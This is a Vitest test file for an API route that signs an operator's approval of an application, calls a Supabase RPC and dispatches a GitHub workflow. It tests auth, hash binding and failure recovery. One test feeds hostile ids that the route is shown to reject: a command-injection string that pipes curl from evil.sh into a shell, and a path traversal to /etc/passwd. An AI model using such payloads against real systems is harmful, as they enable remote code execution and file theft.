import { describe, it, expect, vi, beforeEach } from "vitest";
import { POST } from "./route";
import { createSessionToken } from "@/lib/operatorAuth";
import { signApproval } from "@/lib/approvalSignature";

const mockRpc = vi.fn();
vi.mock("@supabase/supabase-js", () => ({
  createClient: vi.fn(() => ({ rpc: mockRpc })),
}));

const SECRET = "s".repeat(32);
const KEY = "k".repeat(32);
const NOW = 1791428400000;

beforeEach(() => {
  vi.stubEnv("GITHUB_DISPATCH_TOKEN", "test-token");
  vi.stubEnv("OPERATOR_PASSWORD", "correct horse battery");
  vi.stubEnv("SESSION_SECRET", SECRET);
  vi.stubEnv("APPROVAL_SIGNING_KEY", KEY);
  vi.spyOn(Date, "now").mockReturnValue(NOW);
  vi.stubGlobal("fetch", vi.fn(() => Promise.resolve({ ok: true, status: 204 } as Response)));
  mockRpc.mockReset();
  // Both approve_application and reset_approval resolve successfully by default; individual
  // tests override with mockImplementationOnce / mockResolvedValueOnce as needed. Keeping this
  // as a single shared mock (rather than one per RPC name) matches how the real supabase-js
  // client exposes one .rpc() method for every function.
  mockRpc.mockImplementation((fn: string) => {
    if (fn === "approve_application") return Promise.resolve({ data: null, error: null });
    if (fn === "reset_approval") return Promise.resolve({ data: null, error: null });
    return Promise.resolve({ data: null, error: null });
  });
});

const HASH = "a".repeat(64);
const APPROVE_ARGS = {
  p_id: 5,
  p_revision_hash: HASH,
  p_signature: signApproval(KEY, 5, HASH, NOW),
  p_signed_at_ms: NOW,
};

function makeRequest(idInPath = "5", body: unknown = { revision_hash: HASH }, cookie = `cm_session=${createSessionToken(SECRET, NOW)}`) {
  return new Request(`http://localhost/api/applications/${idInPath}/submit`, {
    method: "POST",
    headers: { "Content-Type": "application/json", cookie },
    body: body === null ? undefined : typeof body === "string" ? body : JSON.stringify(body),
  });
}

describe("POST /api/applications/[id]/submit", () => {
  it("calls the approve_application RPC before dispatching", async () => {
    const res = await POST(makeRequest(), { params: Promise.resolve({ id: "5" }) });
    expect(res.status).toBe(200);
    expect(mockRpc).toHaveBeenCalledWith("approve_application", APPROVE_ARGS);
    expect(global.fetch).toHaveBeenCalled();
    // C3: a successful dispatch must never touch the recovery path.
    expect(mockRpc).not.toHaveBeenCalledWith("reset_approval", expect.anything());
  });

  it("dispatches the apply_agent_submit workflow with the application id", async () => {
    const res = await POST(makeRequest(), { params: Promise.resolve({ id: "5" }) });
    expect(res.status).toBe(200);
    const [url, options] = (global.fetch as ReturnType<typeof vi.fn>).mock.calls[0];
    expect(url).toContain("apply_agent_submit.yml/dispatches");
    const body = JSON.parse((options as RequestInit).body as string);
    expect(body.inputs.application_id).toBe("5");
  });

  it("returns 409 and does not dispatch when the RPC rejects the row", async () => {
    mockRpc.mockResolvedValue({
      data: null,
      error: { message: "approve_application: row 5 is not in an approvable state" },
    });
    const res = await POST(makeRequest(), { params: Promise.resolve({ id: "5" }) });
    expect(res.status).toBe(409);
    const body = await res.json();
    expect(body.error).toContain("not in an approvable state");
    expect(global.fetch).not.toHaveBeenCalled();
  });

  it("returns 502 and calls reset_approval when GitHub dispatch fails (C3 -- a failed dispatch must not permanently brick the row)", async () => {
    vi.stubGlobal("fetch", vi.fn(() => Promise.resolve({ ok: false, status: 500 } as Response)));
    const res = await POST(makeRequest(), { params: Promise.resolve({ id: "5" }) });
    expect(res.status).toBe(502);
    expect(mockRpc).toHaveBeenCalledWith("approve_application", APPROVE_ARGS);
    expect(mockRpc).toHaveBeenCalledWith("reset_approval", { p_id: 5 });
  });

  it("returns 502 and calls reset_approval when the fetch call itself throws (network-level failure, not just a non-ok response)", async () => {
    vi.stubGlobal("fetch", vi.fn(() => Promise.reject(new Error("network down"))));
    const res = await POST(makeRequest(), { params: Promise.resolve({ id: "5" }) });
    expect(res.status).toBe(502);
    expect(mockRpc).toHaveBeenCalledWith("reset_approval", { p_id: 5 });
  });

  // This id lands in the environment of the one workflow that sets APPLY_AGENT_ARMED=1.
  // A non-numeric value has no legitimate use, so reject it before it ever gets dispatched
  // -- and before the RPC is even called.
  it.each([
    ['1"; curl evil.sh | sh; "', "shell metacharacters"],
    ["../../etc/passwd", "path traversal"],
    ["", "empty"],
    ["5abc", "trailing garbage"],
  ])("rejects a non-numeric id (%s) without dispatching or calling the RPC", async (badId) => {
    const res = await POST(makeRequest(badId), { params: Promise.resolve({ id: badId }) });
    expect(res.status).toBe(400);
    expect(global.fetch).not.toHaveBeenCalled();
    expect(mockRpc).not.toHaveBeenCalled();
  });

  it("I5: still returns the original 502 (not a 500) when reset_approval's own RPC call throws, on a non-ok dispatch response", async () => {
    vi.stubGlobal("fetch", vi.fn(() => Promise.resolve({ ok: false, status: 500 } as Response)));
    mockRpc.mockImplementation((fn: string) => {
      if (fn === "approve_application") return Promise.resolve({ data: null, error: null });
      if (fn === "reset_approval") return Promise.reject(new Error("network down"));
      return Promise.resolve({ data: null, error: null });
    });
    const res = await POST(makeRequest(), { params: Promise.resolve({ id: "5" }) });
    expect(res.status).toBe(502);
  });

  it("I5: still returns the original 502 (not a 500) when reset_approval's own RPC call throws, on a thrown fetch error", async () => {
    vi.stubGlobal("fetch", vi.fn(() => Promise.reject(new Error("network down"))));
    mockRpc.mockImplementation((fn: string) => {
      if (fn === "approve_application") return Promise.resolve({ data: null, error: null });
      if (fn === "reset_approval") return Promise.reject(new Error("network down again"));
      return Promise.resolve({ data: null, error: null });
    });
    const res = await POST(makeRequest(), { params: Promise.resolve({ id: "5" }) });
    expect(res.status).toBe(502);
  });

  it("I5: still returns the original 502 when reset_approval resolves with an error field (row already moved on)", async () => {
    vi.stubGlobal("fetch", vi.fn(() => Promise.resolve({ ok: false, status: 500 } as Response)));
    mockRpc.mockImplementation((fn: string) => {
      if (fn === "approve_application") return Promise.resolve({ data: null, error: null });
      if (fn === "reset_approval")
        return Promise.resolve({ data: null, error: { message: "not resettable" } });
      return Promise.resolve({ data: null, error: null });
    });
    const res = await POST(makeRequest(), { params: Promise.resolve({ id: "5" }) });
    expect(res.status).toBe(502);
  });

  it("returns 500 when GITHUB_DISPATCH_TOKEN is missing, without dispatching or calling the RPC", async () => {
    vi.stubEnv("GITHUB_DISPATCH_TOKEN", "");
    const res = await POST(makeRequest(), { params: Promise.resolve({ id: "5" }) });
    expect(res.status).toBe(500);
    expect(global.fetch).not.toHaveBeenCalled();
    expect(mockRpc).not.toHaveBeenCalled();
  });

  // Review Focus 5: approval binds to the preview revision the human was shown. A missing or
  // malformed hash must be rejected before anything is approved or dispatched.
  it.each([
    [null, "missing body"],
    ["not json{", "malformed body"],
    [{}, "no revision_hash"],
    [{ revision_hash: "abc" }, "short hash"],
    [{ revision_hash: "G".repeat(64) }, "non-hex hash"],
    [{ revision_hash: "A".repeat(64) }, "uppercase hash"],
    [{ revision_hash: 5 }, "non-string hash"],
  ])("returns 400 without calling rpc or fetch for %j (%s)", async (body) => {
    const res = await POST(makeRequest("5", body), { params: Promise.resolve({ id: "5" }) });
    expect(res.status).toBe(400);
    expect((await res.json()).error).toBe("revision_hash is required");
    expect(mockRpc).not.toHaveBeenCalled();
    expect(global.fetch).not.toHaveBeenCalled();
  });

  it("returns 409 and does not dispatch when the preview changed since it was shown (RPC refuses the stale hash)", async () => {
    mockRpc.mockResolvedValue({
      data: null,
      error: { message: "approve_application: row 5 is not approvable (the preview changed since it was shown)" },
    });
    const res = await POST(makeRequest(), { params: Promise.resolve({ id: "5" }) });
    expect(res.status).toBe(409);
    expect(global.fetch).not.toHaveBeenCalled();
  });

  // Spec 2026-10-08 §9.1: the approval is signed server-side behind the operator login, so a
  // caller holding only the public anon key can neither reach this route nor forge a signature.
  it.each([
    ["", "no cookie"],
    ["cm_session=forged", "garbage cookie"],
    [`cm_session=${createSessionToken("t".repeat(32), NOW)}`, "cookie signed with another secret"],
  ])("returns 401 without calling rpc or fetch (%s)", async (cookie) => {
    const res = await POST(makeRequest("5", { revision_hash: HASH }, cookie), { params: Promise.resolve({ id: "5" }) });
    expect(res.status).toBe(401);
    expect(mockRpc).not.toHaveBeenCalled();
    expect(global.fetch).not.toHaveBeenCalled();
  });

  it("returns 401 while login is not configured at all", async () => {
    vi.stubEnv("OPERATOR_PASSWORD", "");
    const res = await POST(makeRequest(), { params: Promise.resolve({ id: "5" }) });
    expect(res.status).toBe(401);
    expect(mockRpc).not.toHaveBeenCalled();
  });

  it("returns 503 without calling rpc or fetch when APPROVAL_SIGNING_KEY is missing", async () => {
    vi.stubEnv("APPROVAL_SIGNING_KEY", "");
    const res = await POST(makeRequest(), { params: Promise.resolve({ id: "5" }) });
    expect(res.status).toBe(503);
    expect(mockRpc).not.toHaveBeenCalled();
    expect(global.fetch).not.toHaveBeenCalled();
  });

  it("signs exactly the id, rendered hash and signing time it sends", async () => {
    await POST(makeRequest(), { params: Promise.resolve({ id: "5" }) });
    const [, args] = mockRpc.mock.calls.find(([fn]) => fn === "approve_application")!;
    expect(args.p_signature).toMatch(/^[0-9a-f]{64}$/);
    expect(args.p_signature).toBe(signApproval(KEY, args.p_id, args.p_revision_hash, args.p_signed_at_ms));
  });
});
